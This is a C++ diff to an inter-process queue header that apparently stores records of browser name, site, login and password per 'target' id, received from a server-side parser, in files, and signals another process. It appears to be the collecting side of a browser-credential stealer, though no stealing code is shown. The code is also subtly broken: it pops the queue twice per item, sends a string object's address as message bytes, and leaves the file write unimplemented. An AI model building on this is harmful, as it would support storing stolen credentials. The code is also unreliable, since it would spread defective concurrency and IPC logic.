@@ -1,7 +1,7 @@
 #pragma once
 #include <boost/interprocess/ipc/message_queue.hpp>
 #include <queue>
-#include <string>
+#include "fileManager.hpp"
 
 namespace InterProcess {
 	namespace bipc = boost::interprocess;
@@ -9,9 +9,7 @@ namespace InterProcess {
 	struct Data {             //Data storage for sending to another proccess
 		Data() = default;
 		Data(const Data& other) = delete;              //move only object
-		Data& operator=(const Data& other) = delete;   //move only object
-
-		std::string _targetId; //required field
+		Data& operator=(const Data& other) = delete;   //move only object		
 
 		struct targetInfo { //all fields are required
 			std::string os;
@@ -21,12 +19,14 @@ namespace InterProcess {
 
 		struct BrowserData { //all fields are required
 			std::string browserName;
-			std::vector<std::tuple<std::string, std::string, std::string>>resources;
+			std::vector<std::tuple<std::string, std::string, std::string>>resources; //res.name - login - pass
 		}_browserData;
+
+		std::string _targetId; //required field
 	};
 
-	class IPCworkDispatcher { //class that encapsulates and implements parallel message queue processing
-	protected:
+	class IPCworkDispatcher:private FileManager { //class that encapsulates and implements parallel message queue processing
+	protected:                                    //private inheritance to hide fileManager methods 
 		IPCworkDispatcher() {
 			p_worker = std::make_unique<std::thread>(std::bind(&IPCworkDispatcher::dataWaiter, this));
 		}
@@ -42,7 +42,6 @@ namespace InterProcess {
 			static std::shared_ptr<IPCworkDispatcher>_disp = std::make_shared<make_shared_enabler>();
 			return _disp;
 		}
-
 		template<typename T>
 		void setCallback(T fun) { //setter for IPC callback which will be executed on new message
 			callback = fun;
@@ -53,15 +52,25 @@ namespace InterProcess {
 				p_worker.get()->detach();
 			}
 		}
-		void putInQueue(std::unique_ptr<Data>&&data) {     //this func will be called from multiple parser threads through the IPC.newData()
+		void enqueue(std::unique_ptr<Data>&&data) {       //this func will be called from multiple parser threads through the IPC.newData()
 			std::lock_guard<std::mutex>dataLock(dataMt);  //2 PARSER THREADS PUTTS DATA IN QUEUE AND THEN 1 CURRENT WORKER GETTS IT
 			dataQueue.push(std::move(data));
 		}
 	private:
+		bool write() override {
+			openTo(root.u8string() + "/" + currentData->_targetId);
+			//iter throught the data ptr and write it to file;
+			return true;
+		}
 		void dataWaiter() {     //{spinlocked} waiting for new data and then then calls the specific callback
 			while (!stop_flag) {                
 				if (!dataQueue.empty()) {
-					callback(dataQueue.front());
+					currentData.reset(dataQueue.front().release()); //free memory of processed data and own's current data ptr
+					dataQueue.pop(); //drop data ptr after release
+
+					this->write(); //write data to file
+
+					callback(currentData->_targetId); //send data's id to other process
 
 					std::lock_guard<std::mutex>dataLock(dataMt);
 					dataQueue.pop();
@@ -77,9 +86,11 @@ namespace InterProcess {
 		std::unique_ptr<std::thread>p_worker; 
 
 		std::mutex dataMt;
-		std::queue<std::unique_ptr<Data>>dataQueue; //now its onws all data ptrs created in server parser func
+		std::queue<std::unique_ptr<Data>>dataQueue; //onws all data ptrs wich are created in server parser func
 
-		std::function<void(const std::unique_ptr<Data>&)>callback;
+		std::unique_ptr<Data>currentData; //current processing data from dataWaiter
+
+		std::function<void(const std::string)>callback;
 	};
 
 	class IPC {
@@ -87,25 +98,25 @@ namespace InterProcess {
 	public:
 		IPC() {
 			wd = IPCworkDispatcher::getInstance();
-			//bipc::message_queue::remove("msg_queue");
-			//msg_queue = std::make_unique<bipc::message_queue>(bipc::create_only, "msg_queue", 100, sizeof(Data));
+
+			bipc::message_queue::remove("dataReady_q");
+			msg_queue = std::make_unique<bipc::message_queue>(bipc::create_only, "dataReady_q", 100, sizeof(std::string));
 		}
 		~IPC() = default;
 
 		void _init() { //make able to perform ipc operations;
-			wd->setCallback(std::bind(&IPC::sendData, this, std::placeholders::_1));
+			wd->setCallback(std::bind(&IPC::notify, this, std::placeholders::_1));
 			wd->start(); //execute worker thread
 		}
 		void newData(std::unique_ptr<Data>&&data) const { //no effect before _init() call
-			wd->putInQueue(std::move(data));
+			wd->enqueue(std::move(data));
 		}
 	private:
-		//std::unique_ptr<bipc::message_queue>msg_queue;
+		std::unique_ptr<bipc::message_queue>msg_queue;
 		std::shared_ptr<IPCworkDispatcher>wd;
 	private:
-		void sendData(const std::unique_ptr<Data>&data) { //This callback be executed in another thread from IPCworkDispatcher
-			                                              //const data coz ptr's lifetime ends at dataQueue.pop() in dataWaiter.
-				                                         //UB if data will be erased early;
+		void notify(const std::string& id) { //Executs from IPCworkDispatcher thread and sends target id to another process
+			msg_queue->send(&id, id.size(),1);
 		}
 	};
 };
